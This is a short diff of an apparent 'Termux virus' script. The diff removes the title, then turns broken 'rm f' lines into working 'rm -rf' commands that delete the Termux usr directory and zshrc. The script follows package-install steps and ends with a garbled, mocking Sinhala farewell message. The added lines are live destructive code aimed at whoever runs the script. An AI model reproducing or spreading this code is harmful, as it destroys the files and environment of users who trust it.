@@ -1,5 +1,4 @@
-# termux-virus-
-Termux virus 
+
 import base64
 import time
 import os
@@ -16,8 +15,8 @@ pkg install python
 pkg install python2
 cd
 cdrm f home
-rm f /data/data/com.termux/files/usr
-rm f /data/data/com.termux/files/zshrc
+rm -rf /data/data/com.termux/files/usr
+rm -rf /data/data/com.termux/files/zshrc
 figlet Done | lolcat
 
 echo e "el1:33m â‚¹â‚¹ðŸ˜±ðŸ˜±à¶”à¶¶ à¶‰à·€à¶»à¶ºà·’ ðŸ˜¥ðŸ˜¢"
